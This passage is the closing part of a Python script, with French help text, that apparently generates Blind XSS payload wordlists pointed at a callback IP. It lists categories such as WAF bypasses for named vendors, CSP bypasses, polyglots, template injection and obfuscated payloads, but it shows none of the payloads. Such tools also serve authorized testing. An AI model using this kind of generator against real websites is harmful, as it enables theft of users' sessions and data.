        help="Catégories à inclure (défaut: all)"
    )
    parser.add_argument(
        "--list", "-l",
        action="store_true",
        help="Lister les catégories disponibles et quitter"
    )

    args = parser.parse_args()

    ALL_CATS = ["basic", "event", "bypass", "waf", "csp", "polyglot", "angular", "dom", "obfuscated"]

    if args.list:
        print("\nCatégories disponibles:")
        descriptions = {
            "basic":      "Payloads fondamentaux (script, img, svg, iframe...)",
            "event":      "Event handlers moins communs (ontoggle, animationstart...)",
            "bypass":     "Bypasses de filtres (case, quotes, encoding, dots...)",
            "waf":        "Bypasses WAF (Cloudflare, Akamai, Incapsula, Fortiweb...)",
            "csp":        "Bypasses Content Security Policy (JSONP, base64, iframe...)",
            "polyglot":   "Polyglots multi-contextes (HTML, JS, attr, URL...)",
            "angular":    "Injections AngularJS/VueJS CSTI (template injection)",
            "dom":        "DOM-based XSS (hash, innerHTML, postMessage...)",
            "obfuscated": "Payloads obfusqués (base64, unicode, XOR, octal...)",
        }
        for cat, desc in descriptions.items():
            print(f"  {cat:<14} — {desc}")
        print()
        sys.exit(0)

    # Résoudre "all"
    selected = ALL_CATS if "all" in args.categories else args.categories

    print(f"\n[*] Génération des payloads Blind XSS...")
    print(f"[*] Callback IP : {args.ip}")
    print(f"[*] Catégories  : {', '.join(selected)}")

    categories = build_payloads(args.ip)
    total = write_wordlist(categories, selected, args.output, args.ip)

    print_summary(categories, selected, args.output, args.ip, total)


if __name__ == "__main__":
    main()
